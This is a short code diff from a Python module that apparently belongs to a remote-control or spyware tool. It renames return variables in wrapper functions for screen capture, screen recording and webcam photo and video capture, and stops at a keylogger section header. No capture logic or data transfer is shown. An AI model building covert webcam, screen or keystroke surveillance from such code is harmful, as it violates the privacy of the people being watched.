@@ -39,27 +39,27 @@ def kill_application(id=0):
 # Screen
 def capture_screen():
     doit = Screen()
-    succeed_status = doit.run(code='image')
-    return succeed_status
+    filename = doit.run(code='image')
+    return filename
 
 
 def record_screen(seconds=10):
     doit = Screen()
-    succeed_status = doit.run(code='video', time=seconds)
-    return succeed_status
+    filename = doit.run(code='video', time=seconds)
+    return filename
 
 
 # Webcam
 def shot_webcam():
     doit = Webcam()
-    succeed_status = doit.run(code='image')
-    return succeed_status
+    filename = doit.run(code='image')
+    return filename
 
 
 def record_webcam(seconds=10):
     doit = Webcam()
-    succeed_status = doit.run(code='video', time=seconds)
-    return succeed_status
+    filename = doit.run(code='video', time=seconds)
+    return filename
 
 
 # Keylogger
